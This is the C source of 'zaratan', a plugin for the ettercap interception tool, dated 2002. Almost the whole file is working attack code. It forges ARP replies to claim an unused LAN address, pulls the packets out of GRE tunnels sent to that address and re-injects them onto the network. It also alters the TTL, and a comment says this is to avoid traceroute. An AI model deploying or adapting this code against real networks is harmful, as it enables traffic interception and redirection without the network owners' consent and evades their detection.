/*
    zaratan -- ettercap plugin -- Tunnel broker/redirector for GRE tunnels

    Copyright (C) 2002  ALoR <alor@users.sourceforge.net>, NaGA <crwm@freemail.it>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

   $Id: H01_zaratan.c,v 1.1 2002/02/11 20:20:09 alor Exp $
*/

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"
#include "../../src/include/ec_error.h"

int sock, IPS, relaying;
char MyMAC[6];

#ifndef IPPROTO_GRE
#define IPPROTO_GRE 47
#endif

#define IPSNIFF 1
#define MACSNIFF 2
#define ARPSNIFF 3
#define NOSNIFF 4

typedef struct
{
   u_short flags;
   u_short proto;
   union
   {
      struct gre_ckof
      {
         u_short cksum;
         u_short offset;
      }
      gre_ckof;
      u_long key;
      u_long seq;
   }
   gre_void1;
   union
   {
      u_long key;
      u_long seq;
      u_long routing;
   }
   gre_void2;
   union
   {
      u_long seq;
      u_long routing;
   }
   gre_void3;
   union
   {
      u_long routing;
   }
   gre_void4;
} GRE_header;

// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int Parse_Packet(void *buffer);
void Initialize(int Mode);
int Fake_Host(void);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "Broker/redirector for GRE tunnels",
   plug_version:     10,
   plug_type:        PT_HOOK,
   hook_point:       PCK_RECEIVED_RAW,
   hook_function:    &Parse_Packet,
};

//==================================

int Plugin_Init(void *params)
{
   sock = Inet_OpenRawSock(Options.netiface);
   Inet_GetIfaceInfo(Options.netiface, NULL, MyMAC, NULL, NULL);

   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   Inet_CloseRawSock(sock);

   return 0;
}

// =================================
int Fake_Host(void)
{
   unsigned int N_hosts, i, i1=0, i2, base_ip, fake_ip=0;
   unsigned long NetMask;

   Inet_GetIfaceInfo(Options.netiface, NULL, NULL, NULL, &NetMask);
   N_hosts = ntohl(~NetMask);

   base_ip = inet_addr(Host_In_LAN[0].ip)&NetMask;

   for (i=1; i<N_hosts; i++)
   {
      fake_ip = base_ip|htonl(i);
      for (i2=0; i2 < number_of_hosts_in_lan; i2++)
         if (fake_ip == inet_addr(Host_In_LAN[i2].ip))
            break;
      if (i2 == number_of_hosts_in_lan) break;
   }

   if (i1 == N_hosts) return 0;

   return (fake_ip);
}


void Initialize(int Mode)
{
   relaying=0; // relaying ==  0  --- no way
               // relaying ==  1  --- decapsulate and relay
               // relaying ==  2  --- decapsulate and pass to illihid for relaying

   if (number_of_hosts_in_lan==1)
   {
      Plugin_Hook_Output("Can't find an unused IP with -z option...\n");
      Plugin_Hook_Output("...so no relaying\n");
   }
   else
   {
      IPS = Fake_Host();
      if (IPS==0)
      {
         Plugin_Hook_Output("I can't find an unused IP in this LAN.\n");
         Plugin_Hook_Output("I can't create the Fake Host...\n");
         Plugin_Hook_Output("...so no relaying\n");
      }
      else
      {
         struct in_addr toprint;

         toprint.s_addr = IPS;
         Plugin_Hook_Output("Redirect tunnel to %s\n", inet_ntoa(toprint));

         if (Mode==ARPSNIFF)
         {
            Plugin_Hook_Output("Remember to select gateway as SOURCE\n");
            Plugin_Hook_Output("And to set GWIP in the .conf file :)\n");

            relaying = 2;
         }
         else
            relaying = 1;
      }
   }
}

int Parse_Packet(void *buffer)
{

   ETH_header *eth;
   IP_header  *ip, *ipt;
   GRE_header *gre;
   ARP_header *arp;
   int NewMode=NOSNIFF;
   RAW_PACKET *pck_raw;
   static int SniffMode=NOSNIFF;

   if (Options.arpsniff) NewMode=ARPSNIFF;
   if (Options.sniff)    NewMode=IPSNIFF;
   if (Options.macsniff) NewMode=MACSNIFF;

   if (NewMode!=SniffMode)
   {
      Initialize(NewMode);
      SniffMode=NewMode;
   }

   pck_raw = (RAW_PACKET *)buffer;
   eth = (ETH_header *) pck_raw->buffer;

   if (eth->type == htons(ETH_P_IP))
   {
      ip = (IP_header *)(eth+1);
      if ( ip->proto == IPPROTO_GRE && ip->dest_ip==IPS && relaying )
      {
         gre = (GRE_header *) ((int)ip + ip->h_len * 4);
         if (ntohs(gre->proto) == ETH_P_IP)
         {
            int gre_len=4;
            char temp_mac[6];

            // Let'get this packet out of the tunnel!
            // Fix me....care about gre->flags :)
            ipt = (IP_header *)( ((char *)gre) + gre_len );

            if (ntohs(ipt->t_len) > 1500) return 0; // a little check :)

            *(pck_raw->len)=*(pck_raw->len)-(gre_len+ip->h_len*4); //adjust packet len

            memcpy(ip, ipt, ntohs(ipt->t_len));

            ip->tos=7;     // Our dirty trick :P
            ip->ttl=125;   // let's avoid traceroute :)
            ip->checksum = 0;
            ip->checksum = Inet_Forge_ChecksumIP( (u_short *)ip, sizeof(IP_header) );

            if ( relaying==1 )
            {
               // Switch source and dest for relaying
               memcpy(temp_mac, eth->source_mac, 6);
               memcpy(eth->source_mac, eth->dest_mac, 6);
               memcpy(eth->dest_mac, temp_mac, 6);
               Inet_SendRawPacket(sock, pck_raw->buffer, ntohs(ip->t_len)+ETH_HEADER);
            }
         }
      }
   }
   else if (eth->type == htons(ETH_P_ARP))
   {
      arp = (ARP_header *)(eth+1);
      // ARP request for fake IP...let's forge a reply!
      if (!memcmp(arp->dest_ip, &IPS, 4) && ntohs(arp->opcode)==ARPOP_REQUEST && relaying!=0)
      {
         char *reply;
         reply = Inet_Forge_packet( ETH_HEADER + ARP_HEADER );
         Inet_Forge_ethernet( reply, MyMAC, arp->source_add, ETH_P_ARP );
         Inet_Forge_arp( reply + ETH_HEADER, ARPOP_REPLY, MyMAC, IPS, arp->source_add, *(u_long *)arp->source_ip );
         Inet_SendRawPacket(sock, reply, ETH_HEADER + ARP_HEADER);
         Inet_Forge_packet_destroy( reply );
      }
   }
   return 0;
}

// For my sweet love KiN (eh eh eh btw i'm not a HT-H one) ;)

/* EOF */
